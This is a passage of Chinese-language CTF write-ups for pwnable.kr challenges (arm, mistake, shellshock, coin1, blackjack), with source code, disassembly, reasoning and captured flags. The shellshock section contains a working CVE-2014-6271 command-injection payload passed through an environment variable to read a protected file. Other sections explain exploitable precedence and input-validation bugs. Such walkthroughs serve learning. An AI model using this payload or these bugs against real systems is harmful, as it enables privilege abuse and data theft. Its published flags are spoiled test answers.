<div id="outline-container-sec-8-2" class="outline-3">
<h3 id="sec-8-2">分析</h3>
<div class="outline-text-3" id="text-8-2">
<p>
首先放代码
</p>

<div class="org-src-container">

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key1</span><span class="params">()</span></span>{</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"mov r3, pc\n"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key2</span><span class="params">()</span></span>{</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">    <span class="string">"push   {r6}\n"</span></span><br><span class="line">    <span class="string">"add    r6, pc, $1\n"</span></span><br><span class="line">    <span class="string">"bx r6\n"</span></span><br><span class="line">    <span class="string">".code   16\n"</span></span><br><span class="line">    <span class="string">"mov    r3, pc\n"</span></span><br><span class="line">    <span class="string">"add    r3, $0x4\n"</span></span><br><span class="line">    <span class="string">"push   {r3}\n"</span></span><br><span class="line">    <span class="string">"pop    {pc}\n"</span></span><br><span class="line">    <span class="string">".code  32\n"</span></span><br><span class="line">    <span class="string">"pop    {r6}\n"</span></span><br><span class="line">    );</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key3</span><span class="params">()</span></span>{</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"mov r3, lr\n"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>{</span><br><span class="line">    <span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Daddy has very strong arm! : "</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;key);</span><br><span class="line">    <span class="keyword">if</span>( (key1()+key2()+key3()) == key ){</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Congratz!\n"</span>);</span><br><span class="line">        <span class="keyword">int</span> fd = open(<span class="string">"flag"</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">        <span class="keyword">int</span> r = read(fd, buf, <span class="number">100</span>);</span><br><span class="line">        write(<span class="number">0</span>, buf, r);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span>{</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"I have strong leg :P\n"</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
</div>

<div class="org-src-container">

<figure class="highlight"><table><tr><td class="code"><pre><span class="line">(gdb) disass main&#10;Dump of assembler code for function main:&#10;   0x00008d3c &#60;+0&#62;: push    {r4, r11, lr}&#10;   0x00008d40 &#60;+4&#62;: add r11, sp, #8&#10;   0x00008d44 &#60;+8&#62;: sub sp, sp, #12&#10;   0x00008d48 &#60;+12&#62;:    mov r3, #0&#10;   0x00008d4c &#60;+16&#62;:    str r3, [r11, #-16]&#10;   0x00008d50 &#60;+20&#62;:    ldr r0, [pc, #104]  ; 0x8dc0 &#60;main+132&#62;&#10;   0x00008d54 &#60;+24&#62;:    bl  0xfb6c &#60;printf&#62;&#10;   0x00008d58 &#60;+28&#62;:    sub r3, r11, #16&#10;   0x00008d5c &#60;+32&#62;:    ldr r0, [pc, #96]   ; 0x8dc4 &#60;main+136&#62;&#10;   0x00008d60 &#60;+36&#62;:    mov r1, r3&#10;   0x00008d64 &#60;+40&#62;:    bl  0xfbd8 &#60;__isoc99_scanf&#62;&#10;   0x00008d68 &#60;+44&#62;:    bl  0x8cd4 &#60;key1&#62;&#10;   0x00008d6c &#60;+48&#62;:    mov r4, r0&#10;   0x00008d70 &#60;+52&#62;:    bl  0x8cf0 &#60;key2&#62;&#10;   0x00008d74 &#60;+56&#62;:    mov r3, r0&#10;   0x00008d78 &#60;+60&#62;:    add r4, r4, r3&#10;   0x00008d7c &#60;+64&#62;:    bl  0x8d20 &#60;key3&#62;&#10;   0x00008d80 &#60;+68&#62;:    mov r3, r0&#10;   0x00008d84 &#60;+72&#62;:    add r2, r4, r3&#10;   0x00008d88 &#60;+76&#62;:    ldr r3, [r11, #-16]&#10;   0x00008d8c &#60;+80&#62;:    cmp r2, r3&#10;   0x00008d90 &#60;+84&#62;:    bne 0x8da8 &#60;main+108&#62;&#10;   0x00008d94 &#60;+88&#62;:    ldr r0, [pc, #44]   ; 0x8dc8 &#60;main+140&#62;&#10;   0x00008d98 &#60;+92&#62;:    bl  0x1050c &#60;puts&#62;&#10;   0x00008d9c &#60;+96&#62;:    ldr r0, [pc, #40]   ; 0x8dcc &#60;main+144&#62;&#10;   0x00008da0 &#60;+100&#62;:   bl  0xf89c &#60;system&#62;&#10;   0x00008da4 &#60;+104&#62;:   b   0x8db0 &#60;main+116&#62;&#10;   0x00008da8 &#60;+108&#62;:   ldr r0, [pc, #32]   ; 0x8dd0 &#60;main+148&#62;&#10;   0x00008dac &#60;+112&#62;:   bl  0x1050c &#60;puts&#62;&#10;   0x00008db0 &#60;+116&#62;:   mov r3, #0&#10;   0x00008db4 &#60;+120&#62;:   mov r0, r3&#10;   0x00008db8 &#60;+124&#62;:   sub sp, r11, #8&#10;   0x00008dbc &#60;+128&#62;:   pop {r4, r11, pc}&#10;   0x00008dc0 &#60;+132&#62;:   andeq   r10, r6, r12, lsl #9&#10;   0x00008dc4 &#60;+136&#62;:   andeq   r10, r6, r12, lsr #9&#10;   0x00008dc8 &#60;+140&#62;:           ; &#60;UNDEFINED&#62; instruction: 0x0006a4b0&#10;   0x00008dcc &#60;+144&#62;:           ; &#60;UNDEFINED&#62; instruction: 0x0006a4bc&#10;   0x00008dd0 &#60;+148&#62;:   andeq   r10, r6, r4, asr #9&#10;End of assembler dump.&#10;(gdb) disass key1&#10;Dump of assembler code for function key1:&#10;   0x00008cd4 &#60;+0&#62;: push    {r11}       ; (str r11, [sp, #-4]!)&#10;   0x00008cd8 &#60;+4&#62;: add r11, sp, #0&#10;   0x00008cdc &#60;+8&#62;: mov r3, pc&#10;   0x00008ce0 &#60;+12&#62;:    mov r0, r3&#10;   0x00008ce4 &#60;+16&#62;:    sub sp, r11, #0&#10;   0x00008ce8 &#60;+20&#62;:    pop {r11}       ; (ldr r11, [sp], #4)&#10;   0x00008cec &#60;+24&#62;:    bx  lr&#10;End of assembler dump.&#10;(gdb) disass key2&#10;Dump of assembler code for function key2:&#10;   0x00008cf0 &#60;+0&#62;: push    {r11}       ; (str r11, [sp, #-4]!)&#10;   0x00008cf4 &#60;+4&#62;: add r11, sp, #0&#10;   0x00008cf8 &#60;+8&#62;: push    {r6}        ; (str r6, [sp, #-4]!)&#10;   0x00008cfc &#60;+12&#62;:    add r6, pc, #1&#10;   0x00008d00 &#60;+16&#62;:    bx  r6&#10;   0x00008d04 &#60;+20&#62;:    mov r3, pc&#10;   0x00008d06 &#60;+22&#62;:    adds    r3, #4&#10;   0x00008d08 &#60;+24&#62;:    push    {r3}&#10;   0x00008d0a &#60;+26&#62;:    pop {pc}&#10;   0x00008d0c &#60;+28&#62;:    pop {r6}        ; (ldr r6, [sp], #4)&#10;   0x00008d10 &#60;+32&#62;:    mov r0, r3&#10;   0x00008d14 &#60;+36&#62;:    sub sp, r11, #0&#10;   0x00008d18 &#60;+40&#62;:    pop {r11}       ; (ldr r11, [sp], #4)&#10;   0x00008d1c &#60;+44&#62;:    bx  lr&#10;End of assembler dump.&#10;(gdb) disass key3&#10;Dump of assembler code for function key3:&#10;   0x00008d20 &#60;+0&#62;: push    {r11}       ; (str r11, [sp, #-4]!)&#10;   0x00008d24 &#60;+4&#62;: add r11, sp, #0&#10;   0x00008d28 &#60;+8&#62;: mov r3, lr&#10;   0x00008d2c &#60;+12&#62;:    mov r0, r3&#10;   0x00008d30 &#60;+16&#62;:    sub sp, r11, #0&#10;   0x00008d34 &#60;+20&#62;:    pop {r11}       ; (ldr r11, [sp], #4)&#10;   0x00008d38 &#60;+24&#62;:    bx  lr&#10;End of assembler dump.&#10;(gdb)</span><br></pre></td></tr></table></figure>
</div>

<p>
上面的代码让我有些懵逼, 加上 ssh 连上题目服务器后一大堆调试信息铺面而来,
退出的时候看见了 qemu-system-arm 字样, 我总算是明白了: 这次的平台是arm
</p>
</div>


<div id="outline-container-sec-8-2-1" class="outline-4">
<h4 id="sec-8-2-1">ARM汇编简介</h4>
<div class="outline-text-4" id="text-8-2-1">
<p>
先来学习一下arm汇编
</p>

<ul class="org-ul">
<li>pc 保存着即将执行的指令的地址
</li>
<li>r3 保存函数返回值(写起来像是这样的)
</li>
<li>r0 保存函数返回值(反汇编的结果好像是这样的)
</li>
<li>#  是常量标识符
</li>
<li>lr 保存着调用者调用完自己后应该执行的下一条指令的地址(调用者的pc)
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-8-2-2" class="outline-4">
<h4 id="sec-8-2-2">key1</h4>
<div class="outline-text-4" id="text-8-2-2">
<div class="org-src-container">

<figure class="highlight"><table><tr><td class="code"><pre><span class="line">0x00008cd4 &#60;+0&#62;: push    {r11}       ; (str r11, [sp, #-4]!)&#10;0x00008cd8 &#60;+4&#62;: add r11, sp, #0&#10;0x00008cdc &#60;+8&#62;: mov r3, pc&#10;0x00008ce0 &#60;+12&#62;:    mov r0, r3&#10;0x00008ce4 &#60;+16&#62;:    sub sp, r11, #0&#10;0x00008ce8 &#60;+20&#62;:    pop {r11}       ; (ldr r11, [sp], #4)&#10;0x00008cec &#60;+24&#62;:    bx  lr</span><br></pre></td></tr></table></figure>
</div>

<p>
r3 的值就是 pc 的值, pc的值在执行 <code>mov r3, pc</code> 时为 0x8cdc + 0x8.
(arm流水作业特性, 没看懂&#x2026;)
</p>

<p>
总之最终返回 0x8ce4
</p>
</div>
</div>

<div id="outline-container-sec-8-2-3" class="outline-4">
<h4 id="sec-8-2-3">key2</h4>
<div class="outline-text-4" id="text-8-2-3">
<div class="org-src-container">

<figure class="highlight"><table><tr><td class="code"><pre><span class="line">0x00008cf0 &#60;+0&#62;: push    {r11}       ; (str r11, [sp, #-4]!)&#10;0x00008cf4 &#60;+4&#62;: add r11, sp, #0&#10;0x00008cf8 &#60;+8&#62;: push    {r6}        ; (str r6, [sp, #-4]!)&#10;0x00008cfc &#60;+12&#62;:    add r6, pc, #1&#10;0x00008d00 &#60;+16&#62;:    bx  r6&#10;0x00008d04 &#60;+20&#62;:    mov r3, pc&#10;0x00008d06 &#60;+22&#62;:    adds    r3, #4&#10;0x00008d08 &#60;+24&#62;:    push    {r3}&#10;0x00008d0a &#60;+26&#62;:    pop {pc}&#10;0x00008d0c &#60;+28&#62;:    pop {r6}        ; (ldr r6, [sp], #4)&#10;0x00008d10 &#60;+32&#62;:    mov r0, r3&#10;0x00008d14 &#60;+36&#62;:    sub sp, r11, #0&#10;0x00008d18 &#60;+40&#62;:    pop {r11}       ; (ldr r11, [sp], #4)&#10;0x00008d1c &#60;+44&#62;:    bx  lr</span><br></pre></td></tr></table></figure>
</div>

<p>
首先 <code>add r6, pc, #1</code> , r6的值为 <code>0x8cfc + 8 + 1=0x8d05</code>
</p>

<p>
<code>bx r6</code> 跳转到r6表示的地址, 并且根据最低位(1/0)判断进入(thumb/arm)模式,
这个地方显然是进入thumb状态
</p>

<p>
下面两行使 r3=0x8d04+0x4+4 , 由于thumb模式下一条指令两个字节, 所以这次pc只+0x4
</p>

<p>
然后就这么执行下去, 最终返回 0x08d0c
</p>
</div>
</div>

<div id="outline-container-sec-8-2-4" class="outline-4">
<h4 id="sec-8-2-4">key3</h4>
<div class="outline-text-4" id="text-8-2-4">
<div class="org-src-container">

<figure class="highlight"><table><tr><td class="code"><pre><span class="line">0x00008d20 &#60;+0&#62;: push    {r11}       ; (str r11, [sp, #-4]!)&#10;0x00008d24 &#60;+4&#62;: add r11, sp, #0&#10;0x00008d28 &#60;+8&#62;: mov r3, lr&#10;0x00008d2c &#60;+12&#62;:    mov r0, r3&#10;0x00008d30 &#60;+16&#62;:    sub sp, r11, #0&#10;0x00008d34 &#60;+20&#62;:    pop {r11}       ; (ldr r11, [sp], #4)&#10;0x00008d38 &#60;+24&#62;:    bx  lr</span><br></pre></td></tr></table></figure>
</div>

<p>
<code>mov r3, lr</code> r3的值为lr的值
</p>


<div class="org-src-container">

<figure class="highlight"><table><tr><td class="code"><pre><span class="line">0x00008d7c &#60;+64&#62;:    bl  0x8d20 &#60;key3&#62;&#10;0x00008d80 &#60;+68&#62;:    mov r3, r0</span><br></pre></td></tr></table></figure>
</div>

<p>
看下main函数的反汇编, 可以发现下一条指令的地址为0x8d80
</p>

<p>
那么返回值就是0x8d80了
</p>


<p>
最终结果 0x8ce4+0x8d0c+0x8d80=108400 
</p>

<p>
输入得到flag
<code>My daddy has a lot of ARMv5te muscle!</code>
</p>
</div>
</div>
</div>
</div>
<div id="outline-container-sec-9" class="outline-2">
<h2 id="sec-9">mistake</h2>
<div class="outline-text-2" id="text-9">
</div><div id="outline-container-sec-9-1" class="outline-3">
<h3 id="sec-9-1">简介</h3>
<div class="outline-text-3" id="text-9-1">
<pre class="example">
We all make mistakes, let's move on.
(don't take this too seriously, no fancy hacking skill is required at all)

This task is based on real event
Thanks to dhmonkey

hint : operator priority

ssh mistake@pwnable.kr -p2222 (pw:guest)
</pre>

<p>
提示我们这个地方不需要任何fancy的hacking skill, 并且基于真实事件
</p>

<p>
还提示了我们这个是和符号优先级有关的错误
</p>
</div>
</div>

<div id="outline-container-sec-9-2" class="outline-3">
<h3 id="sec-9-2">分析</h3>
<div class="outline-text-3" id="text-9-2">
<p>
mistake.c
</p>

<div class="org-src-container">

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> PW_LEN <span class="number">10</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> XORKEY <span class="number">1</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xor</span><span class="params">(<span class="keyword">char</span>* s, <span class="keyword">int</span> len)</span></span>{</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++){</span><br><span class="line">        s[i] ^= XORKEY;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>{</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    <span class="keyword">if</span>(fd=open(<span class="string">"/home/mistake/password"</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span>){</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"can't open password %d\n"</span>, fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"do not bruteforce...\n"</span>);</span><br><span class="line">    sleep(time(<span class="number">0</span>)%<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> pw_buf[PW_LEN+<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    <span class="keyword">if</span>(!(len=read(fd,pw_buf,PW_LEN) &gt; <span class="number">0</span>)){</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"read error\n"</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;       </span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> pw_buf2[PW_LEN+<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"input password : "</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%10s"</span>, pw_buf2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// xor your input</span></span><br><span class="line">    xor(pw_buf2, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(pw_buf, pw_buf2, PW_LEN)){</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Password OK\n"</span>);</span><br><span class="line">        system(<span class="string">"/bin/cat flag\n"</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span>{</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Wrong Password\n"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
</div>


<p>
题目要求我们输入一个10位密码, 每位与1异或以后再判断是否和./password文件中的密码相等(这个文件我们没有权限读取)
</p>

<p>
并且为了防止爆破加上了延时
</p>


<p>
题目已经提醒了是符号优先级, 我们把代码读一遍就可以发现
<code>if(fd=open("/home/mistake/password",O_RDONLY,0400) &lt; 0)</code> 这行代码是存在问题的
</p>

<p>
'='的优先级小于'&lt;', 所以这段代码相当于将 open("&#x2026;") &lt; 0 的值赋给了fd, fd的值只有0和1两种可能
</p>

<p>
既然我们能够正常执行, 那这个地方就是1了, 为1的话看起来是从 stdout 中读取数据,
不过在控制台中似乎效果和 stdin 是一样的
</p>


<p>
那么这个地方就相当于我们可以控制密码的值, 随便找个数挨位异或一下
</p>

<p>
如 0325476981 和 1234567890, 然后执行./mistake, 等光标不闪的时候先后输入这两个数
</p>

<p>
flag: <code>Mommy, the operator priority always confuses me :(</code>
</p>
</div>
</div>
</div>
<div id="outline-container-sec-10" class="outline-2">
<h2 id="sec-10">shellshock</h2>
<div class="outline-text-2" id="text-10">
</div><div id="outline-container-sec-10-1" class="outline-3">
<h3 id="sec-10-1">简介</h3>
<div class="outline-text-3" id="text-10-1">
<pre class="example">
Mommy, there was a shocking news about bash.
I bet you already know, but lets just make it sure :)


ssh shellshock@pwnable.kr -p2222 (pw:guest)
</pre>

<p>
和bash有关? 沙盒逃逸之类的么
</p>
</div>
</div>

<div id="outline-container-sec-10-2" class="outline-3">
<h3 id="sec-10-2">分析</h3>
<div class="outline-text-3" id="text-10-2">
<pre class="example">
shellshock@ubuntu:~$ ls -l
total 960
-r-xr-xr-x 1 root shellshock     959120 Oct 12  2014 bash
-r--r----- 1 root shellshock_pwn     47 Oct 12  2014 flag
-r-xr-sr-x 1 root shellshock_pwn   8547 Oct 12  2014 shellshock
-r--r--r-- 1 root root              188 Oct 12  2014 shellshock.c
</pre>

<div class="org-src-container">

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>{</span><br><span class="line">    setresuid(getegid(), getegid(), getegid());</span><br><span class="line">    setresgid(getegid(), getegid(), getegid());</span><br><span class="line">    system(<span class="string">"/home/shellshock/bash -c 'echo shock_me'"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
</div>

<p>
一脸懵逼地看着代码
</p>

<p>
查了一下,getegid, setresuid, setresgid, 还是不明白它在干什么,
我该怎么下手
</p>

<p>
后来看到题目简介, 说是a shocking news about bash
</p>


<p>
莫非是漏洞?
</p>

<p>
于是用"bash uid 漏洞"为关键词搜索, 果然搜索到了
<a href="https://bbs.aliyun.com/read/177039.html?page=e" target="_blank" rel="noopener">bash漏洞最新补丁可被绕过</a>
</p>

<p>
在shell中执行代码 <code>env x='() { :;}; /bin/cat flag' ./shellshock</code>
</p>

<p>
flag: <code>only if I knew CVE-2014-6271 ten years ago..!!</code>
</p>

<p>
我十年前就知道CVE-2014-6271就好了!!
</p>
</div>
</div>
</div>
<div id="outline-container-sec-11" class="outline-2">
<h2 id="sec-11">coin1</h2>
<div class="outline-text-2" id="text-11">
</div><div id="outline-container-sec-11-1" class="outline-3">
<h3 id="sec-11-1">简介</h3>
<div class="outline-text-3" id="text-11-1">
<pre class="example">
Mommy, I wanna play a game!
(if your network response time is too slow, try nc 0 9007 inside pwnable.kr server)

Running at : nc pwnable.kr 9007
</pre>

<p>
不详的预感
</p>
</div>
</div>

<div id="outline-container-sec-11-2" class="outline-3">
<h3 id="sec-11-2">分析</h3>
<div class="outline-text-3" id="text-11-2">
<pre class="example">
---------------------------------------------------
-              Shall we play a game?              -
---------------------------------------------------

You have given some gold coins in your hand
however, there is one counterfeit coin among them
counterfeit coin looks exactly same as real coin
however, its weight is different from real one
real coin weighs 10, counterfeit coin weighes 9
help me to find the counterfeit coin with a scale
if you find 100 counterfeit coins, you will get reward :)
FYI, you have 30 seconds.

- How to play - 
1. you get a number of coins (N) and number of chances (C)
2. then you specify a set of index numbers of coins to be weighed
3. you get the weight information
4. 2~3 repeats C time, then you give the answer

- Example -
[Server] N=4 C=2    # find counterfeit among 4 coins with 2 trial
[Client] 0 1        # weigh first and second coin
[Server] 20         # scale result : 20
[Client] 3          # weigh fourth coin
[Server] 10         # scale result : 10
[Client] 2          # counterfeit coin is third!
[Server] Correct!

- Ready? starting in 3 sec... -
</pre>

<p>
N个硬币中有1个假币, 要你称出来
</p>

<p>
简单的二分, 直接上脚本
</p>

<p>
需要注意的是在自己电脑上跑延迟太高30s内跑到100根本不可能,
随便放到哪道题的服务器上跑比较好
</p>

<div class="org-src-container">

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'DEBUG'</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'0'</span>, <span class="number">9007</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'- Ready? starting in 3 sec... -'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    N, C = re.findall(<span class="string">r'\d+'</span>, io.recvline_startswith(<span class="string">'N='</span>).decode())</span><br><span class="line">    print(<span class="string">'{}.N={} C={}'</span>.format(n, N, C))</span><br><span class="line">    N = [str(i) <span class="keyword">for</span> i <span class="keyword">in</span> range(int(N))]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(int(C)):</span><br><span class="line">        length = len(N)</span><br><span class="line">        left  = N[<span class="number">0</span>:length//<span class="number">2</span>]</span><br><span class="line">        right = N[length//<span class="number">2</span>:length]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> len(N) != <span class="number">1</span>:</span><br><span class="line">            io.sendline(<span class="string">' '</span>.join(left))</span><br><span class="line">            weight = int(io.recv())</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> weight != <span class="number">10</span> * len(left):</span><br><span class="line">                N = left</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                N = right</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            io.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'ANS:{}'</span>.format(N[<span class="number">0</span>]))</span><br><span class="line">    io.sendline(N[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
</div>

<p>
flag: <code>b1NaRy_S34rch1nG_1s_3asy_p3asy</code>
</p>

<p>
这是最像flag的一个flag了
</p>
</div>
</div>
</div>

<div id="outline-container-sec-12" class="outline-2">
<h2 id="sec-12">blackjack</h2>
<div class="outline-text-2" id="text-12">
</div><div id="outline-container-sec-12-1" class="outline-3">
<h3 id="sec-12-1">简介</h3>
<div class="outline-text-3" id="text-12-1">
<pre class="example">
Hey! check out this C implementation of blackjack game!
I found it online
* http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html

I like to give my flags to millionares.
how much money you got?


Running at : nc pwnable.kr 9009
</pre>
</div>
</div>

<div id="outline-container-sec-12-2" class="outline-3">
<h3 id="sec-12-2">分析</h3>
<div class="outline-text-3" id="text-12-2">
<p>
代码将近800行
</p>

<p>
原先以为要写个C程序一直赢赢到百万富翁
</p>

<p>
后来觉得太扯了
</p>


<p>
仔细看代码是有漏洞的, 下注的地方原本不能下比自己当前现金还多的注,
但这个地方让用户第二次输入时没有进行校验, 导致了第二次可以输入任意金额
</p>

<p>
输入一个特大的注, 多玩几次就能得到flag了
</p>

<div class="org-src-container">

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">betting</span><span class="params">()</span> <span class="comment">//Asks user amount to bet</span></span><br><span class="line"></span>{</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"\n\nEnter Bet: $"</span>);</span><br><span class="line"> <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;bet);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (bet &gt; cash) <span class="comment">//If player tries to bet more money than player has</span></span><br><span class="line"> {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\nYou cannot bet more money than you have."</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\nEnter Bet: "</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;bet);</span><br><span class="line">        <span class="keyword">return</span> bet;</span><br><span class="line"> }</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">return</span> bet;</span><br><span class="line">} <span class="comment">// End Function</span></span><br></pre></td></tr></table></figure>
</div>

<p>
flag: <code>YaY_I_AM_A_MILLIONARE_LOL</code>
</p>

<p>
